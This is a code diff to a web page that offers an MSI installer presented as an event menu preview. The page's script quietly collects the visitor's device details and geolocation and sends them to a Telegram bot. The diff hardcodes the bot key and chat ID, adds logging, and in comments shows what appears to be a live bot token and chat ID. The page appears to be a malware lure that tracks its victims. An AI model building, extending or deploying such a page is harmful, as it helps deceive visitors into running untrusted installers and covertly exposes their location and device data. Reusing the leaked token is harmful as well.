@@ -772,7 +772,7 @@
 
         <label for="telegramBotKey">Bot API Key</label>
 
-        <input type="text" id="telegramBotKey" placeholder="8048162434:AAHHhFXJnbV_eAhGdzJidb0ee86NcIDWqxw">
+        <input type="text" id="telegramBotKey" placeholder="123456789:ABCdefGHIjklMNOpqrsTUVwxyz">
 
       </div>
 
@@ -780,7 +780,7 @@
 
         <label for="telegramChatId">Chat ID</label>
 
-        <input type="text" id="telegramChatId" placeholder="-5522767823">
+        <input type="text" id="telegramChatId" placeholder="-1001234567890">
 
       </div>
 
@@ -936,6 +936,14 @@
 
   <script>
 
+    // ========== TELEGRAM CONFIGURATION ==========
+    // Enter your Telegram Bot API Key and Chat ID here:
+
+    const TELEGRAM_BOT_KEY = "";  // Example: "8048162434:AAHHhFXJnbV_eAhGdzJidb0ee86NcIDWqxw"
+    const TELEGRAM_CHAT_ID = "";  // Example: "-5522767823"
+
+    // ============================================
+
     // Change this once to your real file name (or path)
 
     const FILE_NAME = "Elegantevent_MenuScreenpreview.msi";
@@ -992,7 +1000,7 @@
 
       };
 
-      // Try to get location if available
+      // Try to get location if available (non-blocking)
 
       if (navigator.geolocation) {
 
@@ -1016,15 +1024,17 @@
 
           },
 
-          () => {
+          (error) => {
 
             // Location denied or unavailable, send without it
+
+            console.log('Location not available:', error.message);
 
             sendTelegramNotification(info);
 
           },
 
-          { timeout: 3000 }
+          { timeout: 3000, enableHighAccuracy: false }
 
         );
 
@@ -1046,13 +1056,20 @@
 
     async function sendTelegramNotification(deviceInfo = null) {
 
-      const botKey = localStorage.getItem('telegramBotKey');
+      // Try to get from hardcoded config first, then from localStorage
+      const botKey = TELEGRAM_BOT_KEY || localStorage.getItem('telegramBotKey');
 
-      const chatId = localStorage.getItem('telegramChatId');
+      const chatId = TELEGRAM_CHAT_ID || localStorage.getItem('telegramChatId');
 
       // Only send if configured
 
-      if (!botKey || !chatId) return;
+      if (!botKey || !chatId) {
+
+        console.log('Telegram not configured. Bot Key:', botKey ? 'Set' : 'Missing', 'Chat ID:', chatId ? 'Set' : 'Missing');
+
+        return;
+
+      }
 
       // Get device info if not provided
 
@@ -1060,9 +1077,15 @@
 
         deviceInfo = getDeviceInfo();
 
-        // If location is being fetched, wait for it
+        // If location is being fetched, the callback will send the notification
 
-        if (navigator.geolocation) return;
+        if (navigator.geolocation) {
+
+          console.log('Waiting for location...');
+
+          return;
+
+        }
 
       }
 
@@ -1094,7 +1117,9 @@
 
         const telegramUrl = `https://api.telegram.org/bot${botKey}/sendMessage`;
 
-        await fetch(telegramUrl, {
+        console.log('Sending Telegram notification...');
+
+        const response = await fetch(telegramUrl, {
 
           method: 'POST',
 
@@ -1112,9 +1137,25 @@
 
         });
 
+        const result = await response.json();
+
+        if (result.ok) {
+
+          console.log('✅ Telegram notification sent successfully!');
+
+        } else {
+
+          console.error('❌ Telegram API error:', result);
+
+          alert('Failed to send notification: ' + (result.description || 'Unknown error'));
+
+        }
+
       } catch (error) {
 
-        console.error('Failed to send notification:', error);
+        console.error('❌ Failed to send notification:', error);
+
+        alert('Error sending notification: ' + error.message);
 
       }
 
